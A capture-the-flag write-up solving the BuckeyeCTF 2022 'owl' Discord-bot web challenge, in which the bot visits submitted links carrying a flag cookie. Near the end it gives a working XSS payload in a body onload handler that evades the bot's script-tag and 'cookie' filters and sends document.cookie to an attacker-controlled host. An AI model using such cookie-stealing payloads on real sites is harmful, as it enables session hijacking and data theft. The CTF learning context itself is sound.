## How it works

Alright, so *owl#9960* is a Discord bot and in the challenege description we have a [source code](https://github.com/cscosu/buckeyectf-2022-public/blob/master/web/owl/index.js) for it. Let's quickly walk trough how it works and how we can get the flag.

In order to trigger any response from *owl*, you have to slide into its Discord DMs and send a message:

```javascript
client.on("message", msg => {
	if(!(msg.channel instanceof discord.DMChannel))
		return;
```

The owl expects the message to be a website link which is validated with the following regex rule:

```javascript
let url = /https?:\/\/(www\.)?([-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b)([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/i
```

If the message contains a valid URL, it will call the ```scout()``` function, otherwise the bot will respond with:
```
âœ¨ðŸ¦‰ hoot hoot ðŸ¦‰âœ¨"
```

The first thing ```scout()``` function checks is if the URL provided in the message contains ```/owl```.

```javascript
if(!url.includes("owl")) {
			resolve("hoot... hoot hoot?");
			return;
		}
```

If it does, then then the javascript browser sets a cookie with ***the flag***:

```javascript
browser.setCookie({
			name: "flag",
			domain: host,
			value: process.env.FLAG
		});
```
This will be our ***target*** - we will somehow have to make the browser gives us the flag cookie.

Before *owl* bot visits the website, it scraps the website HTML content and passes it to ```fly()``` function. Here, the website content udergoes a *safe* check:

```javascript
let bad = /<script[\s\S]*?>[\s\S]*?<\/script>/gi;

	return new Promise((resolve, reject) => {
		if(content.match(bad)) {
			resolve("hoot hoot!! >:V hoot hoot hoot hoot");
			return;
		}
	
		if(content.includes("cookie")) {
			resolve("hoooot hoot hoot hoot hoot hoot");
			return;
		}
```

First, it checks if there are any strings that match the pattern of ```<script> </script>``` and then it checks if the word ```cookie``` is included anywhere in the HTML content.

If both checks fail, then the website is ***absolutely*** safe and the bot proceeds to visit it (like a normal user would):

```javascript
browser.visit(url, () => {
			let html = browser.html();
			if(html.toLowerCase().includes("owl")) {
				resolve("âœ¨ðŸ¦‰ hoot hoot ðŸ¦‰âœ¨");
			} else {
				resolve("");
			}
		});
```

We get a bonus ```âœ¨ðŸ¦‰ hoot hoot ðŸ¦‰âœ¨``` if the website content contains ```owl``` keyword. And that's it. Now how can we exploit it?


## Solution #1

Okay, so since we know that `owl` browser sets the flag as a cookie, we can just read the cookies that were sent with request to our server. The steps would be to:
* setup a public server
* send a link to our server that contains `owl` in URL
* receive request that `owl` browser made to your the and just check the cookies it came with 

Now, since I happened to have a public facing server, I setup a very simple Flask server with `/owl` route and just made Flask print the cookies in a request.

```python
from flask import Flask, render_template, make_response, request

app = Flask(__name__)

@app.route('/owl')
def index():
    print(request.cookies.get('flag'))
    return render_templat('index.html')
```

And there it is, we got the flag!. Now, you can totally do this with other tools, like ```RequestBin```. And if you can't create an `/owl` route, just add `owl` as a request parameter, like this: ```<URL:PORT/?owl>```, and it will work just fine.

## Solution #2

Now, suppose there is no way to read request cookies. 

Then, the second solution is a to create a website with [XSS](https://portswigger.net/web-security/cross-site-scripting) payload on it that will execute javascript code and sent browser cookie as a request parameter. This, however, can be a little tricky since ```owl``` checks for use of ```<script>``` tags (which are commonly used for XSS) and the word ```cookie```.

An interesting thing I learnt during this challenge is that apparently [*zombie.js* browser](http://zombie.js.org/) does not properly render ```<img>``` tags. So I spent way too much time trying to trigger XSS with ```<img onerror=>``` without ever successfully getting the XSS. Ultimately, a more reliable way to get it was with ```<body onload=>``` tags - ```onload``` property, just like `onerror`, can execute javascript code.

The other thing we have to bypass is the word `cookie`. We can decimal enocode it, like this:

```
 &#0000100&#0000111&#0000099&#0000117&#0000109&#0000101&#0000110&#0000116&#0000046&#0000099&#0000111&#0000111&#0000107&#0000105&#0000101&#0000059
```

 which decodes to ```document.cookie```. However, for some reason I could not get it work. I tested it on myself with XSS payload many times and it worked just fine though - again, I think it might have had something to do with *zombie.js* browser HTML rendering.
  
 A cool trick I cannot take credit for is to use javasript ```toLowerCase()``` function:

 ```javascript
 var c00kie = document['COOKIE'.toLowerCase()]
 ```

 The bot only checks for exact match on `cookie`, so making it upper case will not ring any alarms. In order to make an HTTP request, we can use [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest). 

 So finally, we can spin up a public server and put our payload in ```index.html``` file: 


 ```html
 
 <!DOCTYPE html>
<html>

<body onload="var c00kie = document['COOKIE'.toLowerCase()]; var xhr = new XMLHttpRequest(); xhr.open('GET', '<URL:PORT>/?c00kie=' + c00kie, true); xhr.send();">
 <p> definitely not XSS </p>   

</body>
</html>
 ```

 And sure enough, if we look at the server logs, we get a URL encoded flag  (don't mind a test flag I setup earlier):

 Needless to say, if we were to exploit an XSS vulnerability in the wild, then we could not have a peak into vulnerable server logs like I just did - we would check the logs at ```<URL:PORT>``` server instead for the cookie. We can see though that a request is properly made so everything works fine.

Obviously, it's way more effort than the first solution given that you can just print out request cookies, but at least it gives you some cool XSS practice!
